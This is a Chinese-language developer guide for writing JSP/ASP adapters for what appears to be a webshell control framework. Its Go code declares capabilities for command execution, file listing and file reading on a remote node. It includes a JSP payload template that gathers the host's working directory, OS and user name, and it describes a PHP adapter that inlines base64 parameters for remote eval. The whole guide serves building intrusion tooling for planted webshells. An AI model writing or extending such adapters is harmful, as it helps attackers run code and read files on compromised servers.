
# 如何编写自定义适配器

## 目录

- [1. 适配器结构](#1-适配器结构)
- [2. 最小适配器示例](#2-最小适配器示例)
- [3. 专属 Operation](#3-专属-operation)
- [4. ClientFactory](#4-clientfactory)
- [5. 注册到 Manager](#5-注册到-manager)

---

## 1. 适配器结构

```
adapter/
└── jsp/                          # 你的适配器目录
    ├── adapter.go                # 主适配器（能力声明）
    ├── renderer.go               # 模板渲染（生成 JSP 代码）
    ├── operations.go             # 专属 Operation
    ├── client_factory.go         # Client 构造器
    └── capabilities.go           # 支持的能力列表
```

---

## 2. 最小适配器示例

```go
package jsp

import "github.com/Yliken/redbeanshellcore/core"

type Adapter struct{}

func New() *Adapter { return &Adapter{} }

func (a *Adapter) Capabilities() []core.Capability {
    return []core.Capability{
        core.CapInfo,
        core.CapExec,
        core.CapFileList,
        core.CapFileRead,
    }
}
```

---

## 3. 专属 Operation

核心：Build 阶段生成可执行代码，Parse 阶段结构化结果。

```go
// 模板
func renderJspInfo() string {
    return `<%
    String workdir = new java.io.File(".").getAbsolutePath();
    String os = System.getProperty("os.name") + " " + System.getProperty("os.version");
    String user = System.getProperty("user.name");
    out.print(workdir + "\t/\t" + os + "\t" + user);
    %>`
}

// Operation
type jspInfo struct{}

func NewJspInfo() *jspInfo { return &jspInfo{} }
func (o *jspInfo) Name() string { return "info" }

func (o *jspInfo) Build(ctx context.Context, sess *core.Session) (*core.Request, error) {
    req := core.NewRequest(o.Name())
    req.Payload = []byte(renderJspInfo())
    return req, nil
}

func (o *jspInfo) Parse(ctx context.Context, resp *core.Response) (core.Result, error) {
    parts := strings.Split(string(resp.Body), "\t")
    res := &core.InfoResult{BaseResult: core.NewBaseResult(o.Name(), resp.Body)}
    if len(parts) >= 4 {
        res.Workdir = parts[0]
        res.OS = parts[2]
        res.User = parts[3]
    }
    return res, nil
}
```

---

## 4. ClientFactory

```go
type ClientFactory struct{}

func NewClientFactory() *ClientFactory { return &ClientFactory{} }

func (f *ClientFactory) NewClient(ctx context.Context, rec *core.NodeRecord) (*core.Client, error) {
    tr := httpform.New(rec.Config.Endpoint)
    tr.Timeout = 30 * time.Second

    sess := &core.Session{
        NodeID:    rec.Config.ID,
        Endpoint:  rec.Config.Endpoint,
        Adapter:   rec.Config.Adapter,
        Metadata:  rec.Config.Metadata,
    }

    return core.NewClient(
        core.WithSession(sess),
        core.WithTransport(tr),
    ), nil
}
```

---

## 5. 注册到 Manager

方法一：自定义 Factory（推荐）：

```go
// 使用 PHP 适配器内置的工厂
mgr := core.NewManager(registry, phpshell.NewClientFactory())

// 或接入自己的 JSP / ASP 工厂
mgr := core.NewManager(registry, jspadapter.NewClientFactory())
```

方法二：默认 Factory（仅限跑测试 / 接自定义 selector）：

```go
// ⚠️ 默认工厂对所有内置 transport/codec/envelope 都返回错误或 nil，
// 无法直接用于真实环境。必须提供自定义 ClientFactory。
mgr := core.NewManager(registry, core.DefaultClientFactory())
```

使用：

```go
client, _ := mgr.Client(ctx, "jsp-node")
res, _ := client.Do(ctx, jspadapter.NewJspInfo())
```

---

## 参考：PHP 适配器实现

编写 JSP / ASP 适配器前，先读 `adapter/php/` 作为最完整的参考：

- `renderer.go` — 生成可 eval 的 PHP 源码模板
- `operations.go` — Build 阶段把参数 base64 内联、塞入 payload；Parse 阶段结构化响应
- `client_factory.go` — `WrapOp` 把通用 ops 替换成专属版本
- `capabilities.go` — 声明 `CapInfo / CapExec / CapFileList / CapFileRead`

PHP 适配器采用"自包含"模式：参数 base64 编码后直接内联到源码字符串里，
不依赖 `$_POST` 字段，远端 eval 即可直接拿到值。

---

## 注意事项

1. **二进制安全**：读取二进制文件时使用 `getInputStream()`，不要经过字符串转换
2. **字符编码**：统一 UTF-8，避免中文乱码
3. **转义**：参数值可能需要 URL 编码或 HTML 实体编码
